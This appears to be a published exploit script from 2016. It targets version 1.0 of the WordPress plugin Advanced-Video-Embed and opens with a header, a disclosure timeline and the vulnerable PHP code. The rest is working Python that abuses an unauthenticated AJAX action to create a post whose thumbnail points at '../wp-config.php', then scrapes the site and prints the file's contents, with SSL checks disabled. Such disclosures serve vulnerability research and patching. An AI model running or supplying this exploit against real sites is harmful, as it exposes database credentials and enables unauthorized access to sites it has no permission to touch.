#!/usr/bin/env python

# Exploit Title: Advanced-Video-Embed Arbitrary File Download / Unauthenticated Post Creation
# Google Dork: N/A
# Date: 04/01/2016
# Exploit Author: evait security GmbH
# Vendor Homepage: arshmultani - http://dscom.it/
# Software Link: https://wordpress.org/plugins/advanced-video-embed-embed-videos-or-playlists/
# Version: 1.0
# Tested on: Linux Apache / Wordpress 4.2.2

# 	Timeline
# 	03/24/2016 - Bug discovered
# 	03/24/2016 - Initial notification of vendor
# 	04/01/2016 - No answer from vendor, public release of bug

# Vulnerable Code (/inc/classes/class.avePost.php) Line 57:

#  function ave_publishPost(){
#    $title = $_REQUEST['title'];
#    $term = $_REQUEST['term'];
#    $thumb = $_REQUEST['thumb'];
# <snip>
# Line 78:
#    $image_data = file_get_contents($thumb);


# POC - http://127.0.0.1/wordpress/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=[FILEPATH]

# Exploit - Print the content of wp-config.php in terminal (default Wordpress config)

import random
from urllib.request import urlopen
import re
import ssl

# Use if you don't care about the validity of the ssl cert
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

# insert url to wordpress
url = "https://192.168.139.129:12380/blogblog"

# insert the path of the remote file to retrieve
file_path = '../wp-config.php'

randomID = str(int(random.random() * 100000000000))

# Upload the rogue post, and set its thumbnail to the target remote file
objHtml = urlopen(url + '/wp-admin/admin-ajax.php?action=ave_publishPost&title=' + randomID + '&short=rnd&term=rnd&thumb=' + file_path, context=ctx)
content = objHtml.readlines()

# Find the post number
for line in content:
    numbers = re.findall(r'\d+', str(line))
    id = numbers[-1]
    id = int(id) / 10

# Grab the homepage from which we'll find the location of our thumbnail
objHtml = urlopen(url, context=ctx)
content = str(objHtml.readlines())

# Find the location of our remote file
linkstring = re.findall(str(int(id)) + '".*?\.jpeg', content)[0]
jpglink = linkstring.split('src="')[-1]

print(urlopen(jpglink, context=ctx).read())
